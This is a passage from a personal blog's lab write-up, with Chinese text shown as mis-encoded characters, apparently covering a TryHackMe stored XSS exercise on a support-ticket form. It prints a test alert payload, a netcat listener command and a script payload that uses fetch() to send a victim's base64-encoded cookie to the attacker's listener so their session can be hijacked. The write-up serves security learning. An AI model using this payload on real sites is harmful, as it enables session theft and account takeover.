è¯¦æƒ…é¡µé¢ï¼ŒæŸ¥çœ‹è¯¥é¡µé¢æºä»£ç ï¼Œå‘ç°å…³é”®å­—ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Status:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> Open<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Id:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Subject:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Created:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 10/01/2023 15:26<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Contents:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span>hahaha<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>é‡æ–°åˆ›å»ºä¸€ä¸ª ticket
ï¼Œå°è¯•ä½¿ç”¨<code>&lt;/textarea&gt;hahaha</code>é—­åˆ<code>textarea</code>æ ‡ç­¾ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233248687.png" alt="image-20230110233248687" style="zoom:80%;"></p>
<p>ä¸ºäº†éªŒè¯æˆ‘ä»¬æ˜¯å¦å¯ä»¥è¿è¡Œ JavaScript ï¼Œäºæ˜¯æ¥ç€å°è¯• payload
ï¼š<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>ï¼Œç‚¹å‡»æŸ¥çœ‹å¯¹åº”çš„
ticket ï¼Œå‡ºç°å¼¹çª—ï¼š</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233514586.png" alt="image-20230110233514586">
<figcaption aria-hidden="true">image-20230110233514586</figcaption>
</figure>
<p>é€šè¿‡ä¸Šè¿°æ“ä½œè¯å®äº† XSS
æ¼æ´çš„å­˜åœ¨ï¼Œæ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»å¦ä¸€ä¸ªç”¨æˆ·é‚£é‡Œæå–çš„ cookie
ä¿¡æ¯å»åŠ«æŒä»–ä»¬çš„ç™»å½•ä¼šè¯ä»¥æé«˜æˆ‘ä»¬çš„æƒé™ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ„å»ºçš„
payload éœ€è¦èƒ½å¤Ÿæå–ç”¨æˆ·çš„ cookie
ä¿¡æ¯å¹¶å°†å…¶å¯¼å‡ºåˆ°æˆ‘ä»¬é€‰æ‹©çš„å¦ä¸€å°webæœåŠ¡å™¨ä¸Šã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®ç›‘å¬æœåŠ¡å™¨æ¥æ¥æ”¶ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšæåˆ°çš„â€œå¦ä¸€å°webæœåŠ¡å™¨â€ã€‚</p>
<p>ä½¿ç”¨ <strong>Netcat</strong> è®¾ç½®ç›‘å¬æœåŠ¡å™¨ï¼ˆæ”»å‡»è€…çš„æœåŠ¡å™¨ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br></pre></td></tr></tbody></table></figure>
<p>ç„¶åå°±æ˜¯æ„å»º payload
ï¼Œæ ¼å¼ä¸ºï¼š<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code>ã€‚ä¸‹é¢æ˜¯å¯¹
payload çš„è§£æï¼š</p>
<ul>
<li><code>&lt;/textarea&gt;</code>æ ‡ç­¾çš„ä½œç”¨æ˜¯é—­åˆã€‚</li>
<li><code>&lt;script&gt;</code>æ ‡ç­¾æ˜¯ä¸ºäº†æ‰“å¼€ä¸€ä¸ªç¼–å†™ JavaScript
ä»£ç çš„åŒºåŸŸã€‚</li>
<li><code>fetch()</code>å‘½ä»¤çš„ä½œç”¨æ˜¯å‘å‡º HTTP è¯·æ±‚ã€‚</li>
<li><code>{URL_OR_IP}</code>æ˜¯ THM è¯·æ±‚æ•è·å™¨çš„ URL æˆ– THM Attackbox çš„
IP åœ°å€æˆ–ä½ åœ¨THM VPNç½‘ç»œä¸Šçš„IPåœ°å€ã€‚ï¼ˆä¹Ÿå°±æ˜¯ç›‘å¬æœåŠ¡å™¨çš„ IP åœ°å€ï¼‰</li>
<li><code>?cookie=</code>æ˜¯åŒ…å«å—å®³è€… cookie çš„æŸ¥è¯¢å­—ç¬¦ä¸²(query
string)ã€‚</li>
<li><code>btoa()</code>å‘½ä»¤çš„ä½œç”¨æ˜¯å¯¹å—å®³è€…çš„ cookie è¿›è¡Œ
base64ç¼–ç ã€‚</li>
<li><code>document.cookie</code>ç”¨äºè·å– Acme IT Support ç½‘ç«™ä¸Šå—å®³è€…çš„
cookie ã€‚</li>
<li><code>&lt;/script&gt;</code>ç”¨äºå…³é—­ JavaScript ä»£ç åŒºåŸŸã€‚</li>
</ul>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨å…·ä½“çš„ payload å®ç° XSS æ”»å‡»ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ ticket
ï¼Œå¡«å…¥ payload
ï¼š<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.43.251:9001?cookie=' + btoa(document.cookie));&lt;/script&gt;</code>ï¼Œåˆ›å»ºå®Œæ¯•åï¼ŒæŸ¥çœ‹ç»ˆç«¯ï¼Œå¾—åˆ°ç»“æœï¼š</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230111100430594.png" alt="image-20230111100430594">
<figcaption aria-hidden="true">image-20230111100430594</figcaption>
</figure>
<p>æœ€åé€šè¿‡ base64 è§£ç å¾—åˆ° cookie
å€¼ï¼š<code>4AB305E55955197693F01D6F8FD2D321</code>ã€‚</p>
<p>æ³¨ï¼šæˆ‘ä¸€å¼€å§‹æ˜¯ä½¿ç”¨è‡ªå·±çš„è®¡ç®—æœºï¼Œé€šè¿‡ openvpn
è·å–ä¸€ä¸ªIPåœ°å€ï¼Œç„¶ååœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šè¿›è¡Œå®éªŒï¼Œä½†æ˜¯æ— æ³•ç›‘å¬åˆ°ç»“æœï¼Œåæ¥åœ¨æµè§ˆå™¨ä½¿ç”¨
Attackbox ï¼Œå¾—åˆ°ç»“æœã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hxt"
      src="/images/hxt.jpg">
  <p class="site-author-name" itemprop="name">hxt</p>
  <div class="site-description" itemprop="description">May the Force be with you.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">99</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">55</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hxt</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">184k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">2:47</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>


    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
